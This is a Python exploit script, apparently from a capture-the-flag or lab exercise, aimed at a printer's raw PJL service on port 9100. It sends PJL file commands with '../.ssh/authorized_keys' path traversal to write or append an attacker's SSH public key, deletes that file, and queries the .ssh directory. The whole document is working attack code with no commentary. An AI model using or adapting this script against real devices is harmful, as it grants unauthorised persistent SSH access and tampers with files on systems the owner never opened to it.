#!/usr/bin/env python3
import socket

KEY = b"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHd2jjZHAM69tyxWab23os5aDLAjABySY04Zxxw14x41 kali@kali\n"
N = len(KEY)


def one(line: bytes) -> None:
    s = socket.socket()
    s.settimeout(6)
    s.connect(("127.0.0.1", 9100))
    s.sendall(line + KEY)
    try:
        r = s.recv(512)
    except socket.timeout:
        r = b"T"
    s.close()
    print(line[:70], "->", r[:80])


lines = [
    f'@PJL FSUPLOAD NAME="../.ssh/authorized_keys" TYPE=FILE SIZE={N}\r\n'.encode(),
    f'@PJL FSUPLOAD NAME="../.ssh/authorized_keys" TYPE=TEXT SIZE={N}\r\n'.encode(),
    f'@PJL FSWRT NAME="../.ssh/authorized_keys" SIZE={N}\r\n'.encode(),
    f'@PJL FSAPPEND NAME="../.ssh/authorized_keys" SIZE={N}\r\n'.encode(),
    b'@PJL FSDELETE NAME="../.ssh/authorized_keys"\r\n',
]
for L in lines:
    if b"DELETE" in L:
        s = socket.socket()
        s.settimeout(3)
        s.connect(("127.0.0.1", 9100))
        s.sendall(L)
        print(L, s.recv(256))
        s.close()
    else:
        one(L)
print(one.__doc__)
q = socket.socket()
q.settimeout(3)
q.connect(("127.0.0.1", 9100))
q.sendall(b'@PJL FSQUERY NAME="../.ssh"\r\n')
print("Q", q.recv(1024))
q.close()